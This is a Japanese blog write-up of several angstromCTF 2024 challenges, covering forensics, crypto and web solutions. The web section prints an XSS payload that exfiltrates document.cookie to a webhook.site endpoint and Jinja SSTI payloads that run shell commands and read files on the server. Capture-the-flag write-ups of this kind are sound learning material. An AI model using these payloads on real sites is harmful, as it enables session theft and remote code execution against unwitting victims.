# [angstromCTF 2024](https://2024.angstromctf.com/challenges)に参加しました

数ヶ月ぶりにちゃんとCTFをやろうと思っていたところちょうど評判のよい(?)CTFがあったので参加しました.   
楽しいCTFを開催してくれた運営人の皆様, ありがとうございました.  
Web問題に関してはたまたま一緒に作業していたwebフロントを書く後輩に投げて, ほとんど解いてもらいました. ありがとう.  
510pt, 226/831（母数は正の得点を獲得しているチーム数）.

## trip(Misc 485solves)

### Description
> What road was this this [photo](https://files.actf.co/fdea3784a76afd8110498bd596653c433e3f5206bc0fa87f28a5edbd0a622ceb/trip.jpeg) taken on?  
> For example, if the road was "Colesville Road" the flag would be actf{colesville}.

### Consideration
綺麗な風景写真が渡されるので, 写真を撮った場所を答える.  
google lensじゃ絶対引っかからないような写真なので, 画像検索は望み薄.  
次にangstromチームのSNSを覗きに行ったけど該当するものなし.  
そういえばと思って, exiftoolにかけてみたらGPS Positionという欄があって, 緯度と経度があったので無事に場所の特定ができた.
```bash:exiftool trip.jpeg
GPS Position                    : 37 deg 56' 23.60" N, 75 deg 26' 17.11" W
```
あとはgoogle mapで検索して出てきた道の名前を答える.

## aw man(Misc 290solves)

### Description
> [Man](https://files.actf.co/5b9ef628dbf56fedc1ad1861b0ccb96569cd6a97fe49d50cb8f099155adf66b3/mann.jpg)? Is that you?

### Consideration
exiftoolで何も出なかったので, [aperi solve](https://www.aperisolve.com/)に投げてみた.  
enc.txtていうテキストファイルが抽出できたので中身を見てみる.
```txt:enc.txt
5RRjnsi3Hb3yT3jWgFRcPWUg5gYXe81WPeX3vmX
```
ここから地獄で何でdecode（decrypt）すれば良いか検討がつかず時間を溶かす.  
結果的にbaseをロールしていって, base58でdecodeできた.

## do you wanna a build snowman(Misc 317solves)

### Description
> Anna: Do you wanna build a snowman? Elsa: Sure if you can open my snowman [picture](https://files.actf.co/67ad046a16c81593ac82fdc7975dd8713a9c364774b69e2a8a3632e639c7fc66/snowman.jpg)

### Consideration
jpeg形式の画像ファイルが渡されるけど, 開けない.  
headerとかが正しくないんだろうなという推測でbinaryをいじってみることに.  
ファイルの最初にあるべきスタートマーカと呼ばれるSOIがあるらしく, そこが正しくなかったので修正したら開けた. （`fdd8`->`ffd8`）

## PHIlosophy(Crypto 339solves)

### Description
> Clam decided to start studying philosophy, and what is the difference between plus one and minus one anyway...

### Consideration
ほとんどがRSA暗号と同じになっているが, phiの値だけ$ phi = (p-1)(q-1) $でなく$ phi = (p+1)(q+1) $となっている. これでは秘密鍵が正しく生成されずに復号が正しく行われない.  
ここで,  
$
phi = (p+1)(q+1)
    = pq + p + q + 1
    = n + p + q + 1
$  
phiとnは既知なのでp+qが求まる.  
正しいphi'は  
$
phi' = (p-1)(q-1)
    = pq - (p+q) +1
$  
で求まるので正しく秘密鍵が生成できて, 復号が完了する.

## layers(Crypto 240solves)

### Description
> nc challs.actf.co 31398

### Consideration
やっていることとしては  
$ enc = flag \oplus key_1 \oplus key_2 \oplus ... \oplus key_{1000} $  
で, 1000個の鍵は毎回同じ鍵になる.  
よって  
$
flag = enc \oplus key_1 \oplus key_2 \oplus ... \oplus key_{1000}\\
\ \ \ \ \ \ \ \ \ = flag \oplus key_1 \oplus key_1 \oplus key_2 \oplus key_2 \oplus ... \oplus key_{1000} \oplus key_{1000}\\
\ \ \ \ \ \ \ \ \ = flag
$  
encは16進数になるので2番で投げて, 返ってくるflagも16進数なので`bytes.fromhex(flag)`とかで直す.

## markdown(Web 282solves)

### Description
> My friend made an app for sharing their notes!  
> App: [https://markdown.web.actf.co/](https://markdown.web.actf.co/)  
> Send them a link: [https://admin-bot.actf.co/markdown](https://admin-bot.actf.co/markdown)  
> [index.js](https://files.actf.co/c9c1df7ad9c6c62b99454fbde63f1cce5bd69c1dadd87314de9053f4e601c16b/index.js)

### Consideration
リンクを共有する方のアプリケーションは送ったリンクを見に行くらしい ＆ markdownを生成する方のアプリケーションは サニタイズしない  
というとこまで後輩が進めてくれたのでそこからスタート.  
①tokenをリークさせて, ②レスポンスを自分が見れるサーバーに送るということをしないといけない.  
②に関しては前に[webhook](https://webhook.site/)というものを使っていた人がいたのを思い出してクリア.  
①は後輩がプロですぐに以下を考えてくれた.  
```
<img src="x" onerror="fetch('https://webhook.site/595b3f51-eaea-4381-988d-da5cb183770a', {method:'POST', body:document.cookie})" />
```
ほとんど後輩が解いてくれた. 感謝.

## winds(Web 259solves)

### Description
> Challenge: [https://winds.web.actf.co/](https://winds.web.actf.co/)

### Consideration
SSTIができるというところまで後輩が進めてくれたのでそこからスタート.  
config見ても, 環境変数見てもflagないし, flagに繋がる情報は見つからず.  
以下で, lsコマンドを実行する.  
```
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -lah').read() }}
```
flag.txtがあったので以下で中身を見る.  
```
{{ request.form.get.__globals__['__builtins__']['open']('./flag.txt').read() }}
```  
リクエストで送るtextは並べ替えられてしまうけど, seed値が0なのでローカルで上のリクエストになるような文字列を生成できる.  
